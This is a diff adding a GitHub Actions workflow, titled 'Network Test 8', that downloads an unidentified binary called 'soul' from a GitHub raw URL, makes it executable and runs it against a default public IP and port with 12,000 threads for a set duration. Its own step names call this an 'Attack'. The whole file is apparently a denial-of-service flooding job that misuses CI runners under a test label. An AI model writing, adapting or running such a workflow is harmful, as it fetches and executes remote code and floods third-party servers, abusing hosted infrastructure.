@@ -1,0 +1,44 @@
+name: "Network Test 8"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: "Target IP"
+        required: true
+        default: "20.219.7.150"
+      target_port:
+        description: "Target Port"
+        required: true
+        default: "26133"
+      duration:
+        description: "Test Duration"
+        required: true
+        default: "120"
+
+jobs:
+  network-test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    
+    steps:
+    - name: "🔧 Setup Environment"
+      run: |
+        echo "🚀 Starting Network Test"
+        echo "🎯 Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
+        echo "⏱️ Duration: ${{ inputs.duration }} seconds"
+        echo "💥 Threads: 12000"
+        echo "🔧 Binary Source: URL"
+
+    - name: "📥 Download Binary from URL"
+      run: |
+        wget -O soul "https://raw.githubusercontent.com/flamedimdos-a11y/Nnn/main/soul"
+        chmod +x soul
+        echo "✅ Binary downloaded from URL"
+        ls -la
+
+    - name: "⚡ Execute Attack - FULL DURATION"
+      run: |
+        echo "🔥 STARTING ATTACK - Will run for ${{ inputs.duration }} seconds"
+        timeout ${{ inputs.duration }} ./soul "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.duration }}" "12000" || echo "✅ Attack completed after full duration"
+        echo "🎯 ATTACK FINISHED - Target hit for ${{ inputs.duration }} seconds"
